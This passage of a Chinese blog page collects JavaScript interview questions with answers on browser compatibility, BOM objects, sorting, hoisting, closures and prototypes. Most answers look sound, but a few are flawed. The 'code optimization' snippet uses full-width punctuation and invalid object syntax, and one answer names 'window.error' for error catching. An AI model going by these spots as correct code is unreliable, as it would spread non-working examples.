class="line">          alert(i)</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;)(i);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="列出3条以上-ff-和-IE-的脚本兼容问题"><a href="#列出3条以上-ff-和-IE-的脚本兼容问题" class="headerlink" title="列出3条以上 ff 和 IE 的脚本兼容问题"></a>列出3条以上 ff 和 IE 的脚本兼容问题</h2><p>(1) window.event：</p>
+<blockquote>
+<p>表示当前的事件对象，IE有这个对象，FF没有，FF通过给事件处理函数传递事件对象</p>
+</blockquote>
+<p>(2) 获取事件源</p>
+<blockquote>
+<p>IE用srcElement获取事件源，而FF用target获取事件源</p>
+</blockquote>
+<p>(3) 添加，去除事件</p>
+<blockquote>
+<p>IE：element.attachEvent(“onclick”, function) element.detachEvent(“onclick”, function)<br>FF：element.addEventListener(“click”, function, true) element.removeEventListener(“click”, function, true)</p>
+</blockquote>
+<p>(4) 获取标签的自定义属性</p>
+<blockquote>
+<p>IE：div1.value或div1[“value”]<br>FF：可用div1.getAttribute(“value”);</p>
+</blockquote>
+<h2 id="列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"><a href="#列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个" class="headerlink" title="列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"></a>列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个</h2><blockquote>
+<p>对象：Window document location screen history navigator<br>方法：Alert() confirm() prompt() open() close()</p>
+</blockquote>
+<h2 id="在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"><a href="#在Javascript中什么是伪数组？如何将伪数组转化为标准数组？" class="headerlink" title="在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"></a>在Javascript中什么是伪数组？如何将伪数组转化为标准数组？</h2><blockquote>
+<p>伪数组（类数组）：无法直接调用数组方法或期望length属性有什么特殊的行为，但仍可以对真正数组遍历方法来遍历它们。<br>典型的是函数的argument参数，还有像调用getElementsByTagName,document.childNodes之类的,它们都返回NodeList对象都属于伪数组。<br>可以使用Array.prototype.slice.call(fakeArray)将数组转化为真正的Array对象。</p>
+</blockquote>
+<h2 id="写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10"><a href="#写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10" class="headerlink" title="写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;"></a>写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="built_in">arguments</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="built_in">arguments</span>[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> num==<span class="string">'number'</span>) &#123;</span><br><span class="line">      result += num;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>写出代码对下列数组去重并从大到小排列 {5,2,3,6,8,6,5,4,7,1,9}</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length<span class="number">-1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.length<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &lt; arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">var</span> temp = arr[j];</span><br><span class="line">        arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">        arr[j+<span class="number">1</span>] = temp;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = arr[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> s = i + <span class="number">1</span>; s &lt; arr.length; s++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[s] == c)&#123;</span><br><span class="line">        <span class="comment">//debugger;</span></span><br><span class="line">        arr.splice(s,<span class="number">1</span>);</span><br><span class="line">        s--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fn([<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">9</span>]).toString());</span><br></pre></td></tr></table></figure>
+<h2 id="请写出一个程序"><a href="#请写出一个程序" class="headerlink" title="请写出一个程序"></a>请写出一个程序</h2><p>在页面加载完成后动态创建一个form表单，并在里面添加一个input对象并给它任意赋值后义post方式提交到：<code>http://127.0.0.1/save.php</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> form=<span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</span><br><span class="line">  form.setAttribute(<span class="string">"method"</span>, <span class="string">"post"</span>);</span><br><span class="line">  form.setAttribute(<span class="string">"action"</span>, <span class="string">"http://127.0.0.1/save.php"</span>);</span><br><span class="line">  <span class="keyword">var</span> input=<span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">  form.appendChild(input);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(form);</span><br><span class="line">  input.value=<span class="string">"cxc"</span>;</span><br><span class="line">  form.submit();<span class="comment">//提交表单</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"><a href="#用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24" class="headerlink" title="用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"></a>用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//升序算法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt;arr.length-i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">var</span> c=arr[j];<span class="comment">//交换两个变量的位置</span></span><br><span class="line">        arr[j]=arr[j+<span class="number">1</span>];</span><br><span class="line">        arr[j+<span class="number">1</span>]=c;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> arr.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sort([<span class="number">23</span>,<span class="number">45</span>,<span class="number">18</span>,<span class="number">37</span>,<span class="number">92</span>,<span class="number">13</span>,<span class="number">24</span>]));</span><br></pre></td></tr></table></figure>
+<h2 id="前端代码优化的方法"><a href="#前端代码优化的方法" class="headerlink" title="前端代码优化的方法"></a>前端代码优化的方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> User = &#123; </span><br><span class="line">  count = <span class="number">1</span>，</span><br><span class="line">  getCount：<span class="function"><span class="keyword">function</span>（）</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(User.getCount());</span><br><span class="line"><span class="keyword">var</span> func = User.getCount;</span><br><span class="line"><span class="built_in">console</span>.log(func());</span><br></pre></td></tr></table></figure>
+<p>输出结果：1 undefined（因为是window对象执行了func函数）;</p>
+<h2 id="下列JavaScript代码执行后，依次alert的结果是"><a href="#下列JavaScript代码执行后，依次alert的结果是" class="headerlink" title="下列JavaScript代码执行后，依次alert的结果是"></a>下列JavaScript代码执行后，依次alert的结果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a=b=<span class="number">5</span>;</span><br><span class="line">  alert(<span class="keyword">typeof</span> a);</span><br><span class="line">  alert(<span class="keyword">typeof</span> b);</span><br><span class="line">&#125;)();</span><br><span class="line">alert(<span class="keyword">typeof</span> a);</span><br><span class="line">alert(<span class="keyword">typeof</span> b);</span><br></pre></td></tr></table></figure>
+<p>输出结果：<br>number<br>number<br>undefined<br>number</p>
+<h2 id="下列JavaScript代码执行后，iNum的值是"><a href="#下列JavaScript代码执行后，iNum的值是" class="headerlink" title="下列JavaScript代码执行后，iNum的值是"></a>下列JavaScript代码执行后，iNum的值是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i&lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iNum++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果：答案：8</p>
+<h2 id="输出结果是多少"><a href="#输出结果是多少" class="headerlink" title="输出结果是多少"></a>输出结果是多少</h2><p>1）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b = a * <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果：26</p>
+<p>2）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var a;</span></span><br><span class="line"><span class="regexp">  var b = a * 0;</span></span><br><span class="line"><span class="regexp">  if (b == b) &#123;</span></span><br><span class="line"><span class="regexp">    console.log(b * 2 + "2" - 0 + 4);</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log(!b * 2 + "2" - 0 + 4);</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p>输出结果：6</p>
+<p>3）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">t</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = t++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure>
+<p>输出结果：10</p>
+<p>4）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = test++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure>
+<p>输出结果：10</p>
+<p>5）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  t = test++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure>
+<p>输出结果：10</p>
+<p>6）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  t = t + test;</span><br><span class="line">  <span class="built_in">console</span>.log(t);</span><br><span class="line">  <span class="keyword">var</span> t = <span class="number">3</span>;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure>
+<p>输出结果：NaN 10</p>
+<p>7）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b = a / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果：”26”</p>
+<p>8）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var a;</span></span><br><span class="line"><span class="regexp">  var b = a /</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> + <span class="number">4</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> + <span class="number">4</span>); <span class="comment">// !Infinity --&gt;false</span></span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出结果：Infinity24</p>
+<ol>
+<li>用程序实现找到html中id名相同的元素？</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=<span class="string">'form1'</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div1'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div2'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div3'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div4'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div5'</span>&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div id=<span class="string">'div3'</span>&gt;id名重复的元素&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      <span class="keyword">var</span> nodes = <span class="built_in">document</span>.querySelectorAll(<span class="string">"#form1&gt;*"</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = nodes.length; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> attr = nodes[i].getAttribute(<span class="string">"id"</span>);</span><br><span class="line">        <span class="keyword">var</span> s=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(nodes[j].getAttribute(<span class="string">"id"</span>) == attr)&#123;</span><br><span class="line">            s++;</span><br><span class="line">            alert(<span class="string">"id为："</span> + attr + <span class="string">"的元素出现"</span> + s + <span class="string">"次"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+<p>输出结果：id为：div3的元素出现2次</p>
+<h2 id="下列JavaScript代码执行后，运行的结果是"><a href="#下列JavaScript代码执行后，运行的结果是" class="headerlink" title="下列JavaScript代码执行后，运行的结果是"></a>下列JavaScript代码执行后，运行的结果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id=<span class="string">'btn'</span>&gt;点击我&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var btn = document.getElementById('btn');</span></span><br><span class="line"><span class="regexp">  var handler = &#123;</span></span><br><span class="line"><span class="regexp">      id: '_eventHandler',</span></span><br><span class="line"><span class="regexp">      exec: function()&#123;</span></span><br><span class="line"><span class="regexp">          alert(this.id);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  btn.addEventListener('click', handler.exec);</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p>输出结果：”btn”</p>
+<h2 id="下列JavaScript代码执行后，依次-alert-的结果"><a href="#下列JavaScript代码执行后，依次-alert-的结果" class="headerlink" title="下列JavaScript代码执行后，依次 alert 的结果"></a>下列JavaScript代码执行后，依次 alert 的结果</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">proto</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">F.prototype = obj.proto;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F();</span><br><span class="line">obj.proto.c = <span class="number">3</span>;</span><br><span class="line">obj.proto = &#123;<span class="attr">a</span>:<span class="number">-1</span>, <span class="attr">b</span>:<span class="number">-2</span>&#125;;</span><br><span class="line">alert(f.a); <span class="comment">// 1</span></span><br><span class="line">alert(f.c); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">delete</span> F.prototype[<span class="string">'a'</span>];</span><br><span class="line">alert(f.a); <span class="comment">// undefined</span></span><br><span class="line">alert(obj.proto.a);  <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
+<h2 id="下列JavaScript代码执行后的效果是"><a href="#下列JavaScript代码执行后的效果是" class="headerlink" title="下列JavaScript代码执行后的效果是"></a>下列JavaScript代码执行后的效果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=<span class="string">'list'</span>&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li&gt;item&lt;/</span>li&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li&gt;item&lt;/</span>li&gt;</span><br><span class="line">  &lt;li&gt;item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> items = <span class="built_in">document</span>.querySelectorAll(<span class="string">'#list &gt; li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      items[i].style.backgroundColor = <span class="string">'#fee'</span>;</span><br><span class="line">    &#125;, <span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出结果：报错，因为i一直等于5，items[i]获取不到元素</p>
+<h2 id="下列JavaScript代码执行后的-li-元素的数量是"><a href="#下列JavaScript代码执行后的-li-元素的数量是" class="headerlink" title="下列JavaScript代码执行后的 li 元素的数量是"></a>下列JavaScript代码执行后的 li 元素的数量是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;Item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;Item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;Item&lt;/</span>li&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var items = document.getElementsByTagName('li');</span></span><br><span class="line"><span class="regexp">  for(var i = 0; i &lt; items.length; i++)&#123;</span></span><br><span class="line"><span class="regexp">    if(items[i].innerHTML == '')&#123;</span></span><br><span class="line"><span class="regexp">      items[i].parentNode.removeChild(items[i]);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+<p>结果是：4</p>
+<h2 id="程序中捕获异常的方法"><a href="#程序中捕获异常的方法" class="headerlink" title="程序中捕获异常的方法"></a>程序中捕获异常的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.error;</span><br><span class="line">try&#123;&#125;catch()&#123;&#125;finally&#123;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="原型对象上添加方法"><a href="#原型对象上添加方法" class="headerlink" title="原型对象上添加方法"></a>原型对象上添加方法</h2><p>给String对象添加一个方法，传入一个 string 类型的参数，然后将 string 的每个字符间价格空格返回<br>例如：<code>addSpace(&quot;hello world&quot;) // -&gt; &#39;h e l l o w o r l d&#39;</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.spacify = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.split(<span class="string">''</span>).join(<span class="string">' '</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
